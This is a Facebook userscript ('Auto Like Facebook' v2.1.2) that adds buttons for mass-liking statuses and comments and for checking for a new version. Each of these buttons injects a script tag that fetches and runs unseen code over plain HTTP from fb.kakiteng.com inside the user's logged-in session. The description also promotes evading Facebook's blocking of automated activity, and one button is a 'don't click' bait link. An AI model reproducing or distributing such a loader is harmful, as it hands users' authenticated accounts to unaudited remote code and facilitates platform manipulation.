// ==UserScript==
// @name			Auto Like Facebook
// @namespace		auto_like_facebook
// @description		Auto Like Facebook by Aplikasi Jempol Otomatis -Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
// @author			Aplikasi Jempol Otomatis
// @authorURL		http://www.facebook.com/pages/Aplikasi-Jempol-Otomatis/166111363413208
// @homepage		https://www.facebook.com/pages/Aplikasi-Jempol-Otomatis/166111363413208
// @include			htt*://www.facebook.com/*
// @icon			http://i1190.photobucket.com/albums/z445/ichandkusuma/berbagijempol.jpg
// @version			v.2.1.2
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude 		htt*://apps.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==

// ======= Jangan Menghapus Credit =======
// == Nama : Auto Like Facebook v.2.1.2 ==
// ======= Author : Ichand Kusuma ========
// ======= Site : www.kakiteng.com =======
// =======================================

body = document.body;
if(body != null) {div = document.createElement("div");div.setAttribute('id','like2');div.style.position = "fixed";div.style.display = "block";div.style.width = "130px"; div.style.opacity= 0.90;div.style.bottom = "+140px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AutoLike()'><center>Like Semua Status</center></a></a>"
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="http://fb.kakiteng.com/nlas",b.body.appendChild(a);void(0);};}
body = document.body;
if(body != null) {div = document.createElement("div");div.setAttribute('id','like3');div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+119px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='LikeComments()'><center>Like Semua Komentar</center></a>"
body.appendChild(div);unsafeWindow.LikeComments = function() {javascript:(a=(b=document).createElement("script")).src="http://fb.kakiteng.com/nlac",b.body.appendChild(a);void(0);};}
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+95px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' href='' title='Refresh'><center>Reload (F5)</center></a>"
body.appendChild(div);}
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+74px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' href='https://www.facebook.com/pages/%C5%A0%C4%81%C6%94%C4%81-%C5%9C%C5%AB%C4%B7%C3%A4-%C5%9D%C5%A4%C3%A2%C5%A4%C5%A9%C5%9F-%C3%A2%C5%8B%C4%91%C3%A5-F%D0%A4%D1%82%D0%A4-%CE%9B%D0%9F%C4%8F%C3%A2-%D0%88%D0%B4%D0%B9%D0%91%D0%B4n-%C4%BB%C5%A9%CF%81%CE%B1-%C4%BB%C4%AC%D0%BA%CE%9E-%D0%85%C8%9A%CE%B1%C8%9A%D0%8F%C8%99-%D1%95%CE%94%E1%BB%B2%CE%B1-%E1%BB%B3%D0%B4%D0%BD/320392291382587' title='Jangan Diklik'><center>Jangan Diklik</center></a>"
body.appendChild(div);}
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+50px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/pages/Aplikasi-Jempol-Otomatis/166111363413208' title='Donasi Kakiteng c Kusuma'><blink><center>Halaman AJO</center></blink></a>"
body.appendChild(div);}
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+29px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='UpdateVersion()'><center>Check New Version</center></a></a>"
body.appendChild(div);unsafeWindow.UpdateVersion = function() {javascript:(a=(b=document).createElement("script")).src="http://fb.kakiteng.com/v212",b.body.appendChild(a);void(0);};}

// ======= Jangan Menghapus Credit =======

// == Nama : Auto Like Facebook v.2.1.2 ==
// ======= Author : Aplikasi Jempol Otomatis ========
// ======= Site : https://www.facebook.com/pages/Aplikasi-Jempol-Otomatis/166111363413208 =======
// =======================================